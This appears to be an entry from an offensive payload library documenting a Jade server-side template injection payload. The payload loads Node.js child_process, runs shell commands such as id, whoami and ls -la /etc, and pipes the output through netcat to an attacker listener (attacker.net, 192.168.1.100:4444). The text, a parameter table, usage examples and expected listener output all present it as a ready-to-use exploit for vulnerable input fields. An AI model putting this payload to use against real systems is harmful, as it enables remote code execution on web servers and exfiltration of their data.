---
type: command
executor: jade
data: |-
  - var x = root.process
  - x = x.mainModule.require
  - x = x('child_process')
  = x.exec('id | nc attacker.net 80')
output: null
platforms:
  - web
  - linux
tags:
  - ssti
  - rce
  - exfiltration
verified: true
validated: true
---

# jade-ssti-exec-arbitrary-command-via-netcat

## Command

```jade
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

## Description

This command is a Jade template payload for SSTI exploitation. It injects code to load the Node.js 'child_process' module and execute an arbitrary shell command (default: 'id'), piping the output to a netcat connection for exfiltration to an attacker listener. Use this in vulnerable input fields rendered by Jade to achieve RCE and remote output capture.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Command inside exec | The shell command to run (replace 'id') | Yes |
| nc target (attacker.net) | Attacker's IP or hostname for exfiltration | Yes |
| Port (80) | Listening port on attacker machine | Yes |

## Examples

### Basic Usage

Inject into a vulnerable form field or URL parameter:
```jade
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('whoami | nc 192.168.1.100 4444')
```

### Advanced Usage

For file listing:
```jade
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('ls -la /etc | nc 192.168.1.100 4444')
```

## Expected Output

The web response may show no direct output (due to piping), but on the attacker's nc listener (e.g., nc -lvnp 4444), expect the command result, such as:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

If unsuccessful, the listener receives nothing; check for errors in app logs or network blocks.

## Related

- [[procedures/server-side-template-injection-jade-exec-command-and-list-users]]
- [[codes/jade-ssti-exec-command-payload]]
